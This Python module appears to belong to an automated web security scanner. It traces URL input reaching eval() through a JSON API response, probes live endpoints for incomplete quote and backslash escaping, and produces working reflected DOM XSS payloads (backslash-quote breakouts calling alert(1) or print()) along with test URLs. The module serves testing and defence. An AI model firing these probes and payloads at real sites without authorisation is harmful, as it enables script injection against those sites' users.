"""
EvalJsonFlowAnalyzer
====================
Traces the data-flow pattern where a URL parameter reaches an eval() call
through a JSON API response, identifies the exact escaping behaviour of the
server-side JSON encoder, and derives the minimum set of test inputs that
could demonstrate execution.

This covers the "reflected DOM XSS via eval()" class:

    page loads searchResults.js
        ↓
    xhr.open("GET", "/search-results" + location.search)
        ↓
    server returns {"results":[],"searchTerm":"<CONTROLLED>"}
        ↓
    eval('var obj = ' + this.responseText)          ← sink
        ↓
    obj.searchTerm is set from the JSON literal

The server is a "JSON reflector": it echos the query parameter inside a JSON
string value. The exploit relies on the difference between:

  * characters the server JSON-encodes correctly  (double-quote → \")
  * characters the server does NOT encode          (backslash   → \)

When the server encodes " but not \, sending \"  causes the server to produce
\\", which eval() reads as (literal backslash)(end-of-string), breaking out of
the JSON string context and allowing code execution.

Detection strategy
------------------
1. Locate XHR/fetch calls whose URL includes the input parameter.
2. Confirm the API endpoint exists and reflects the parameter.
3. Probe specific characters:
     a. double-quote     — must be escaped as \" by a correct encoder
     b. backslash        — must be escaped as \\ by a correct encoder
     c. combined \\\"   — if server only escapes ", this produces \\" and breaks out
4. Reconstruct the exact string that eval() will see.
5. Generate a payload that exploits the confirmed weakness.
6. Return an EvalJsonFlowResult with all evidence.

Never generates payloads unless the escaping weakness is confirmed from live
probe responses. When the endpoint uses JSON.parse() instead of eval() the
weakness is inert — this is detected and the candidate is marked NOT_EXPLOITABLE.
"""
from __future__ import annotations

import json
import re
import urllib.parse
from dataclasses import dataclass, field
from enum import StrEnum
from typing import Any

import httpx

_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36"
)

_TIMEOUT = 10

# Pattern: xhr.open / fetch / $.get / axios points at a path and appends
# window.location.search (or a named URL parameter) to it.
_XHR_ENDPOINT_RE = re.compile(
    r"""
    (?:
        xhr\s*\.\s*open\s*\(\s*["']GET["']\s*,\s*  |
        fetch\s*\(\s*                               |
        \$\.(?:get|ajax)\s*\(\s*                   |
        axios\s*\.\s*get\s*\(\s*
    )
    (["'])                          # quote char
    ([^"']+?)                       # endpoint path
    \1
    \s*\+\s*
    window\.location\.search        # appends location.search
    """,
    re.VERBOSE | re.IGNORECASE,
)

# Pattern: eval( ... responseText)
_EVAL_RESPONSE_RE = re.compile(
    r"eval\s*\(\s*[^)]*?(?:responseText|response\.text|\.response)\s*\)",
    re.IGNORECASE,
)

# Pattern: JSON.parse( ... responseText) — safe, not exploitable via this path
_JSON_PARSE_RE = re.compile(
    r"JSON\s*\.\s*parse\s*\(\s*[^)]*?(?:responseText|response\.text|\.response)\s*\)",
    re.IGNORECASE,
)

# Detect whether a JSON response body has invalid JSON due to backslash issue
_BACKSLASH_IN_JSON_STRING_RE = re.compile(
    r'"[^"]*\\[^"\\nrtbf/"u][^"]*"'  # unescaped backslash inside JSON string
)


class EscapingWeakness(StrEnum):
    """What the server-side encoder gets wrong."""
    NONE            = "none"             # Correctly escapes both " and \
    BACKSLASH_ONLY  = "backslash_only"   # Escapes " but not \  → exploitable
    NEITHER         = "neither"          # Escapes neither → fully exploitable
    CUSTOM          = "custom"           # Unknown pattern — see raw evidence


class SinkType(StrEnum):
    EVAL       = "eval"        # eval(expression_containing_responseText)
    JSON_PARSE = "json_parse"  # JSON.parse(responseText) — safe
    UNKNOWN    = "unknown"


class CandidateStatus(StrEnum):
    CANDIDATE           = "candidate"
    CONTEXT_IDENTIFIED  = "context_identified"
    TEST_GENERATED      = "test_generated"
    NOT_EXPLOITABLE     = "not_exploitable_under_test"
    INCONCLUSIVE        = "inconclusive"


@dataclass
class EscapingProfile:
    """Observed character-by-character escaping behaviour of the JSON endpoint."""
    double_quote_escaped: bool = False    # " reflected as \"    (correct)
    backslash_escaped: bool    = False    # \ reflected as \\   (correct)
    angle_lt_escaped: bool     = False    # < HTML-escaped?
    angle_gt_escaped: bool     = False    # > HTML-escaped?
    single_quote_escaped: bool = False    # '

    @property
    def weakness(self) -> EscapingWeakness:
        if self.double_quote_escaped and self.backslash_escaped:
            return EscapingWeakness.NONE
        if self.double_quote_escaped and not self.backslash_escaped:
            return EscapingWeakness.BACKSLASH_ONLY
        if not self.double_quote_escaped and not self.backslash_escaped:
            return EscapingWeakness.NEITHER
        return EscapingWeakness.CUSTOM

    @property
    def is_exploitable(self) -> bool:
        return self.weakness in (EscapingWeakness.BACKSLASH_ONLY, EscapingWeakness.NEITHER)


@dataclass
class ProbeEvidence:
    """Raw evidence from one escaping probe."""
    input_value: str
    raw_response: str
    parsed_value: str | None  # None if JSON was invalid
    eval_string: str             # what eval() would receive
    json_valid: bool


@dataclass
class EvalJsonFlowResult:
    """
    Complete result of the flow analysis.

    Contains the data-flow trace, escaping evidence, derived payloads,
    and the candidate status. Never marks a candidate confirmed —
    that requires browser execution evidence.
    """
    status: CandidateStatus = CandidateStatus.INCONCLUSIVE
    sink_type: SinkType = SinkType.UNKNOWN

    # Data flow
    source_param: str = ""
    api_endpoint: str = ""
    js_file_url: str  = ""
    js_snippet: str   = ""

    # Escaping analysis
    escaping: EscapingProfile = field(default_factory=EscapingProfile)
    probe_evidence: list[ProbeEvidence] = field(default_factory=list)
    weakness_description: str = ""

    # Derived test inputs — ordered by expected reliability
    payloads: list[str] = field(default_factory=list)
    # Full test URLs ready for the browser confirmer
    test_urls: list[str] = field(default_factory=list)

    # Rationale for each payload
    payload_rationale: list[str] = field(default_factory=list)

    # Human explanation
    explanation: str = ""
    error: str = ""

    def as_exec_semantics(self) -> dict[str, Any]:
        """
        Produce the exec_semantics dict that dom_xss.py embeds in candidates.
        This is read by iterative.py / dom_confirm.py to route correctly.
        """
        return {
            "xss_type":         "dom",
            "source_type":      "query",
            "source_param":     self.source_param,
            "api_endpoint":     self.api_endpoint,
            "sink_kind":        "json_eval",
            "sink_capability":  "js_execution",
            "sink_label":       f"eval() via JSON response ({self.api_endpoint})",
            "validation_mode":  "api_probe_then_browser",
            "escaping_weakness": self.escaping.weakness.value,
            "payloads":         self.payloads,
        }


class EvalJsonFlowAnalyzer:
    """
    Analyzes a JS source string for the XHR→JSON→eval() data-flow pattern.

    Usage::

        analyzer = EvalJsonFlowAnalyzer(scope_engine)
        result = analyzer.analyze(
            js_content=js_source_code,
            js_url="/resources/js/searchResults.js",
            page_url="https://example.com/",
        )
        if result.status == CandidateStatus.TEST_GENERATED:
            # result.payloads has ready-to-use inputs
            # result.test_urls has ready-to-use URLs
    """

    def __init__(
        self,
        scope: Any | None = None,
        http_timeout: int = _TIMEOUT,
    ) -> None:
        self._scope = scope
        self._timeout = http_timeout

    # ------------------------------------------------------------------
    # Primary entry point
    # ------------------------------------------------------------------

    def analyze(
        self,
        js_content: str,
        js_url: str,
        page_url: str,
    ) -> EvalJsonFlowResult:
        """
        Analyze JS source for the XHR→responseText→eval() pattern.

        Returns EvalJsonFlowResult. Never raises — errors are recorded
        in result.error and result.status = INCONCLUSIVE.
        """
        result = EvalJsonFlowResult(
            js_file_url=js_url,
        )

        # 1. Detect the sink type
        result.sink_type = self._classify_sink(js_content)
        if result.sink_type == SinkType.JSON_PARSE:
            result.status = CandidateStatus.NOT_EXPLOITABLE
            result.explanation = (
                "The response is processed with JSON.parse(), not eval(). "
                "JSON.parse() does not execute code — this pattern is not "
                "exploitable via injection into the JSON string."
            )
            return result

        if result.sink_type == SinkType.UNKNOWN:
            result.status = CandidateStatus.INCONCLUSIVE
            result.error = "No eval(responseText) or JSON.parse(responseText) found"
            return result

        # 2. Locate the API endpoint and source parameter
        endpoint, snippet = self._find_endpoint(js_content)
        if not endpoint:
            result.status = CandidateStatus.INCONCLUSIVE
            result.error = "Could not identify API endpoint from JS source"
            return result

        result.api_endpoint = endpoint
        result.js_snippet = snippet
        result.status = CandidateStatus.CANDIDATE

        # Derive the source parameter from the endpoint and page URL
        result.source_param = self._infer_source_param(js_content, page_url, endpoint)

        # 3. Probe the endpoint to observe escaping behaviour
        absolute_endpoint = self._resolve_endpoint(endpoint, page_url)
        if not absolute_endpoint:
            result.status = CandidateStatus.CONTEXT_IDENTIFIED
            result.explanation = (
                f"eval(responseText) pattern confirmed in {js_url}. "
                "Could not resolve API endpoint to an absolute URL for live probing."
            )
            return result

        try:
            escaping, evidence = self._probe_escaping(
                absolute_endpoint, result.source_param
            )
        except Exception as exc:
            result.status = CandidateStatus.CONTEXT_IDENTIFIED
            result.error = f"Probe failed: {exc}"
            result.explanation = (
                f"eval(responseText) pattern confirmed in {js_url}. "
                f"Live escaping probe failed: {exc}"
            )
            return result

        result.escaping = escaping
        result.probe_evidence = evidence
        result.status = CandidateStatus.CONTEXT_IDENTIFIED

        # 4. Derive payloads from the confirmed escaping behaviour
        if not escaping.is_exploitable:
            result.status = CandidateStatus.NOT_EXPLOITABLE
            result.explanation = (
                "The JSON endpoint correctly escapes both double-quotes (as \\\") "
                "and backslashes (as \\\\). The eval() call receives valid JSON "
                "that cannot be broken out of via string injection."
            )
            return result

        payloads, rationale = self._derive_payloads(
            escaping, result.source_param, absolute_endpoint
        )
        if not payloads:
            result.status = CandidateStatus.INCONCLUSIVE
            result.explanation = "No viable payload could be derived from the escaping profile."
            return result

        result.payloads = payloads
        result.payload_rationale = rationale
        result.weakness_description = self._describe_weakness(escaping)

        # Build test URLs
        result.test_urls = [
            self._build_test_url(page_url, result.source_param, p)
            for p in payloads
        ]

        result.status = CandidateStatus.TEST_GENERATED
        result.explanation = self._build_explanation(result)
        return result

    # ------------------------------------------------------------------
    # Sink classification
    # ------------------------------------------------------------------

    def _classify_sink(self, js: str) -> SinkType:
        """
        Determine whether the response data reaches eval() or JSON.parse().

        JSON.parse() is safe — eval() is potentially dangerous.
        Must check eval() first since some code calls JSON.parse inside eval.
        """
        has_eval  = bool(_EVAL_RESPONSE_RE.search(js))
        has_parse = bool(_JSON_PARSE_RE.search(js))

        # If both appear, eval() is the dangerous one — classify as eval.
        if has_eval:
            return SinkType.EVAL
        if has_parse:
            return SinkType.JSON_PARSE
        return SinkType.UNKNOWN

    # ------------------------------------------------------------------
    # Endpoint extraction
    # ------------------------------------------------------------------

    def _find_endpoint(self, js: str) -> tuple[str, str]:
        """
        Find the API endpoint that receives location.search.

        Returns (endpoint_path, surrounding_snippet).
        """
        m = _XHR_ENDPOINT_RE.search(js)
        if m:
            endpoint = m.group(2)
            start = max(0, m.start() - 40)
            snippet = js[start: m.end() + 40]
            return endpoint, snippet

        # Fallback: search for path + location.search in any form
        fallback = re.search(
            r"""(["'])([^"'/?#]+(?:\?[\w=&%]+)?)\1\s*\+\s*(?:window\.)?location\.search""",
            js, re.IGNORECASE,
        )
        if fallback:
            endpoint = fallback.group(2)
            snippet = js[max(0, fallback.start()-40): fallback.end()+40]
            return endpoint, snippet

        return "", ""

    def _infer_source_param(self, js: str, page_url: str, endpoint: str) -> str:
        """
        Identify the query parameter that the JS reads.

        Check for URLSearchParams.get('paramName') or form the search term
        parameter name from the endpoint path.
        """
        # Look for URLSearchParams.get('paramName')
        m = re.search(
            r"""URLSearchParams[^)]{0,100}\.get\s*\(\s*["']([\w-]+)["']""",
            js, re.IGNORECASE,
        )
        if m:
            return m.group(1)

        # Infer from the page URL's existing parameters
        parsed = urllib.parse.urlparse(page_url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            return next(iter(params))

        # Common default: endpoint path often contains the parameter name
        # e.g. /search-results → search
        path_match = re.search(r"/(?:search|query|q|find)-?(\w*)", endpoint, re.I)
        if path_match:
            return "search"

        return "q"  # last resort

    def _resolve_endpoint(self, endpoint: str, page_url: str) -> str:
        """Turn a relative endpoint path into an absolute URL."""
        if endpoint.startswith(("http://", "https://")):
            return endpoint
        parsed = urllib.parse.urlparse(page_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        return base + (endpoint if endpoint.startswith("/") else f"/{endpoint}")

    # ------------------------------------------------------------------
    # Escaping probe
    # ------------------------------------------------------------------

    def _probe_escaping(
        self, endpoint: str, param: str
    ) -> tuple[EscapingProfile, list[ProbeEvidence]]:
        """
        Send targeted probe values to the endpoint and observe escaping.

        Probes:
          1. double_quote:  input '"'  → server should produce '\"'
          2. backslash:     input '\\' → server should produce '\\\\'
          3. combined:      input '\\"' → the breakout sequence
        """
        profile = EscapingProfile()
        evidence: list[ProbeEvidence] = []

        probe_inputs = [
            ("double_quote",    '"'),
            ("backslash",       "\\"),
            ("combined",        '\\"'),
        ]

        with httpx.Client(
            follow_redirects=True,
            timeout=self._timeout,
            verify=False,
            headers={"User-Agent": _UA},
        ) as client:
            for name, value in probe_inputs:
                probe_url = f"{endpoint}?{urllib.parse.urlencode({param: value})}"
                if self._scope:
                    try:
                        self._scope.assert_allowed(probe_url, operation="http_request")
                    except Exception:
                        continue

                try:
                    resp = client.get(probe_url)
                    raw = resp.text
                except Exception as exc:
                    evidence.append(ProbeEvidence(
                        input_value=value, raw_response=f"ERROR: {exc}",
                        parsed_value=None, eval_string="", json_valid=False,
                    ))
                    continue

                # Try to parse the JSON
                try:
                    parsed_obj = json.loads(raw)
                    parsed_val = str(parsed_obj.get(param, parsed_obj.get("searchTerm", "")))
                    json_valid = True
                except json.JSONDecodeError:
                    parsed_val = None
                    json_valid = False

                eval_string = "var obj = " + raw
                ev = ProbeEvidence(
                    input_value=value,
                    raw_response=raw[:300],
                    parsed_value=parsed_val,
                    eval_string=eval_string[:300],
                    json_valid=json_valid,
                )
                evidence.append(ev)

                # Analyse the escaping from this probe
                if name == "double_quote":
                    # Correctly escaped: raw contains \"  inside the JSON string
                    # Incorrectly:       raw contains "  unescaped (would break JSON)
                    profile.double_quote_escaped = '\\"' in raw or json_valid
                elif name == "backslash":
                    # Correctly escaped: server outputs \\\\ (JSON for a literal \)
                    # Incorrectly:       server outputs \\  (a bare, single backslash)
                    profile.backslash_escaped = (
                        json_valid and parsed_val == "\\"  # round-trip survived
                    )
                    # Additional check: invalid JSON with bare backslash = not escaped
                    if not json_valid and "\\" in raw:
                        # A single unescaped backslash in the JSON string
                        # makes it invalid JSON → server did NOT escape it
                        profile.backslash_escaped = False

        return profile, evidence

    # ------------------------------------------------------------------
    # Payload derivation
    # ------------------------------------------------------------------

    def _derive_payloads(
        self,
        escaping: EscapingProfile,
        param: str,
        endpoint: str,
    ) -> tuple[list[str], list[str]]:
        """
        Construct payloads that exploit the observed escaping weakness.

        Returns (payloads, rationale_strings).

        The logic is:
          - Weakness = BACKSLASH_ONLY: server escapes " → \" but not \ → \\
            Input \\"  produces  \\"  in JSON → eval sees: \ (literal) + " (string-end)
            The double-quote ends the JSON string, the code runs in expression context.
            Payload: \\"-alert(1)}//
            Eval sees: var obj = {"...","searchTerm":"\\"-alert(1)}//"}
            Reads as:   searchTerm = literal-backslash, then "-alert(1)}// is code.

          - Weakness = NEITHER: server doesn't escape " at all.
            Payload: "-alert(1)-" (classic string breakout)
        """
        payloads: list[str] = []
        rationale: list[str] = []

        if escaping.weakness == EscapingWeakness.BACKSLASH_ONLY:
            # The definitive PortSwigger reflected-DOM XSS pattern.
            # Input \\\" → server produces \\\"  → JSON string is \\  + "  (end of string)
            # Continuing characters appear after the closed string value.
            # The object literal must be closed too: }
            # Then // comments out the closing "} of the original object.
            payloads.append('\\"}-alert(1)//')
            rationale.append(
                'Server escapes " as \\" but not \\ as \\\\. '
                'Input \\\\" produces \\\\\\" in JSON raw text. '
                'eval() reads \\\\ as a literal backslash, then " closes the string. '
                'The } closes the JSON object, -alert(1) executes, // discards the tail.'
            )
            # Alternative using arithmetic context (avoids curly brace requirement)
            payloads.append('\\"}-alert(1)-\\"')
            rationale.append(
                'Arithmetic variant: }-alert(1)-\\" closes the object, executes, re-opens string.'
            )
            # print() variant for filters that block alert()
            payloads.append('\\"}-print()//')
            rationale.append(
                'print() variant: equivalent breakout using print() dialog instead of alert().'
            )

        elif escaping.weakness == EscapingWeakness.NEITHER:
            # Neither quote nor backslash is escaped — trivial string breakout.
            payloads.append('"-alert(1)-"')
            rationale.append(
                'Server does not escape " at all. '
                'The double-quote closes the JSON string value, '
                '-alert(1)- evaluates in expression context, '
                'the trailing " re-opens the string.'
            )
            payloads.append('";alert(1)//')
            rationale.append(
                'Statement variant: " ends the string, ; starts a new statement, // discards tail.'
            )

        return payloads, rationale

    # ------------------------------------------------------------------
    # URL builder
    # ------------------------------------------------------------------

    def _build_test_url(self, page_url: str, param: str, payload: str) -> str:
        """
        Build a test URL that delivers the payload to the page.

        The payload goes into the search parameter of the PAGE URL (not the
        API endpoint) — the JS reads location.search and appends it to the
        XHR URL automatically.
        """
        parsed = urllib.parse.urlparse(page_url)
        query = urllib.parse.urlencode({param: payload}, quote_via=urllib.parse.quote)
        return urllib.parse.urlunparse(parsed._replace(query=query))

    # ------------------------------------------------------------------
    # Reporting helpers
    # ------------------------------------------------------------------

    def _describe_weakness(self, escaping: EscapingProfile) -> str:
        w = escaping.weakness
        if w == EscapingWeakness.BACKSLASH_ONLY:
            return (
                "Incomplete JSON escaping: double-quotes are escaped (\\\")"
                " but backslashes are not (should be \\\\\\\\). "
                "Input \\\\\\\" produces \\\\\\\\\\\" in the raw JSON response. "
                "eval() treats \\\\\\\\ as a literal backslash and \\\" as end-of-string, "
                "breaking out of the JSON string value into JavaScript expression context."
            )
        if w == EscapingWeakness.NEITHER:
            return (
                "The JSON endpoint reflects the parameter value without escaping "
                "double-quotes or backslashes. Any quote character ends the JSON "
                "string value and the remaining input executes as JavaScript."
            )
        return "No exploitable escaping weakness found."

    def _build_explanation(self, result: EvalJsonFlowResult) -> str:
        lines = [
            f"Source: URL parameter '{result.source_param}' (from window.location.search)",
            f"API endpoint: {result.api_endpoint}",
            f"JS file: {result.js_file_url}",
            "Sink: eval('var obj = ' + responseText)",
            f"Escaping weakness: {result.escaping.weakness.value}",
            "",
            result.weakness_description,
            "",
            "Derived test inputs:",
        ]
        for p, r in zip(result.payloads, result.payload_rationale, strict=False):
            lines.append(f"  Payload: {p!r}")
            lines.append(f"  Rationale: {r}")
            lines.append("")
        return "\n".join(lines)
